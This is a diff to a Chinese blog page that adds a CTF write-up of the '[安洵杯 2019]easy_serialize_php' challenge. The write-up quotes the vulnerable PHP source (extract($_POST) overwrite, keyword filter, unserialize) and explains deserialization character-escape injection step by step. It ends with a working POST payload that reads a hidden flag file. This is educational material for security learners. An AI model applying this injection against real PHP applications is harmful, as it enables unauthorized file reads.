@@ -418,7 +418,7 @@ class Student
 $exp = $_GET[&#39;exp&#39;];
 echo &quot;&lt;br&gt;&quot;;
 unserialize($exp);</code></pre>
-<p>题目很简单，我们仔细分析一下解题构造pop链。</p>
+<p>题目很简单，我们仔细分析一下解题构造利用链。</p>
 <pre><code>php的反序列化漏洞主要存在于魔术方法，啥是魔术方法呢？
 按我的理解就是它自己就可以执行，不需要我们人为去特意调用它。
 接下来介绍两个基础的方法:
@@ -438,6 +438,100 @@ __destruct:析构函数会在某个对象的所有引用都被删除或者当对
 <p>private成员变量被序列化变成%00test%00</p>
 <p>而protecter的成员变量变成%00*%00test</p>
 <p>而这些在浏览器打印是不会被显示的，所以在遇到这样的成员变量时打印出来的序列化数据还需要自己加上这些。</p>
+<h3><span id="0x04反序列化漏洞进一步拓展练习">0x04反序列化漏洞进一步拓展练习</span></h3><p>前面的构造链很简单就是让析构函数被调用并且覆盖原有的值，接下来练习一下更加复杂的反序列化利用链的题。</p>
+<h4><span id="安洵杯-2019easy_serialize_php">[安洵杯 2019]easy_serialize_php</span></h4><p>开局源码分析:</p>
+<pre><code class="php"> &lt;?php
+
+$function = @$_GET[&#39;f&#39;];
+
+function filter($img){
+    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);
+    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;
+    return preg_replace($filter,&#39;&#39;,$img);
+}
+
+
+if($_SESSION){
+    unset($_SESSION);
+}
+
+$_SESSION[&quot;user&quot;] = &#39;guest&#39;;
+$_SESSION[&#39;function&#39;] = $function;
+
+extract($_POST);
+
+if(!$function){
+    echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;;
+}
+
+if(!$_GET[&#39;img_path&#39;]){
+    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);
+}else{
+    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));
+}
+
+$serialize_info = filter(serialize($_SESSION));
+
+if($function == &#39;highlight_file&#39;){
+    highlight_file(&#39;index.php&#39;);
+}else if($function == &#39;phpinfo&#39;){
+    eval(&#39;phpinfo();&#39;); //maybe you can find something in here!
+}else if($function == &#39;show_image&#39;){
+    $userinfo = unserialize($serialize_info);
+    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));</code></pre>
+<p>这道题看完代码仍然是迷糊的没有思路，于是上网学习了一下关于这道题的bypass思路。</p>
+<p>1.php反序列化字符逃逸</p>
+<p>所谓逃逸就是逃出特定规则，php的反序列化过程必须严格按照序列化规则才能实现反序列化</p>
+<p>那么这个规则如何逃逸呢？</p>
+<p>大佬们测试了在原有的序列化后添加字符:</p>
+<pre><code class="php">&lt;?php
+$str=&#39;a:2:{i:0;s:5:&quot;Cupid&quot;;i:1;s:5:&quot;aaaaa&quot;;}abc&#39;;
+#$str=&#39;a:2:{i:0;s:5:&quot;Cupid&quot;;i:1;s:5:&quot;aaaaa&quot;;}&#39;
+var_dump(unserialize($str));
+?&gt;</code></pre>
+<p>我们拿到php中运行一下</p>
+<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20200919152323515.png" alt="image-20200919152323515"></p>
+<p>可以看到跟不加abc字符反序列化后的结果一样，说明php能够识别出哪些属于反序列化的范畴并自动过滤。</p>
+<p>利用这个特性可以绕过某些针对字符的检测机制。</p>
+<p>第二个逃逸点:</p>
+<pre><code class="php">&lt;?php
+$_SESSION[&quot;user&quot;]=&#39;flagflagflagflagflagflag&#39;；
+$_SESSION[&quot;function&quot;]=&#39;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;}&#39;;
+$_SESSION[&quot;img&quot;]=&#39;L2QwZzNfZmxsbGxsbGFn&#39;;
+echo serialize($_SESSION);
+?&gt;
+最后得到:    
+a:3:{s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;}&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;}</code></pre>
+<p>接下来再看一下上面这个例子，假如题目中会过滤掉flag字段(替换为空)。</p>
+<p>那么上面的序列化字符串过滤后及变成了:</p>
+<pre><code>a:3:{s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;}&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;}</code></pre><p>那么这个时候再将这串字符串进行反序列化后会得到什么呢？</p>
+<p>仔细观察上面被过滤后和原来字符串的变化，6个flag字符长度24，替换后为空。</p>
+<p>但反序列化机制才不管这么多呢，它会继续向后读取24个字符也就是会读取到:</p>
+<pre><code>;s:8:&quot;function&quot;;s:59:&quot;a</code></pre><p>最后读取到以”;结尾。</p>
+<p>而后按照img的规则分别向后读取，最后满足反序列化规则依然成功的反序列化出:</p>
+<p>替换后的真实结果是:</p>
+<pre><code>a:2:{s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;}&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;}
+可以看到依然是反序列化为正确的</code></pre><p>将其反序列化后就是:</p>
+<pre><code class="php">结果:
+array(3) { 
+[&quot;user&quot;]=&gt; string(24) &quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot; 
+[&quot;img&quot;]=&gt; string(20) &quot;ZDBnM19mMWFnLnBocA==&quot; 
+[&quot;dd&quot;]=&gt; string(1) &quot;a&quot; 
+}</code></pre>
+<p>用数组形式构造就是:</p>
+<pre><code class="php">$_SESSION[&quot;user&quot;]=&#39;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&#39;;
+$_SESSION[&quot;img&quot;]=&#39;ZDBnM19mMWFnLnBocA==&#39;;
+$_SESSION[&quot;dd&quot;]=&#39;a&#39;;</code></pre>
+<p>最后就是回到题目构造利用链最后拿flag了。</p>
+<p>这道题之所以需要逃逸就是存在img的部分，导致无法让反序列化函数反序列化后的数据达到我们想要的读取效果，因而需要把img的部分给他脱离掉换上我们的img。</p>
+<p>关于base64的内容是phpinfo里面找到的:d0g3_f1ag.php</p>
+<p>所以最后的payload：</p>
+<pre><code>_SESSION[phpflag]=;s:7:&quot;xxxxxxx&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}</code></pre><p>最后get传参?f=show_image,再通过post传入参数(上面的payload)送入extract变量覆盖-&gt;最后送入反序列化后解码img的部分-&gt;并读取d0g3_f1ag.php</p>
+<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20200919155741608.png" alt="image-20200919155741608"></p>
+<p>再将这个文件路径进行base64编码</p>
+<p>最后拿到flag：</p>
+<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20200919155638209.png" alt="image-20200919155638209"></p>
+<p>喔，最后再去看AdminTony大佬写的文章好像没有那么吃力了(自己唬自己还是很吃力，tcl毕竟……)</p>
 
         </div>
         <!-- .entry-content -->
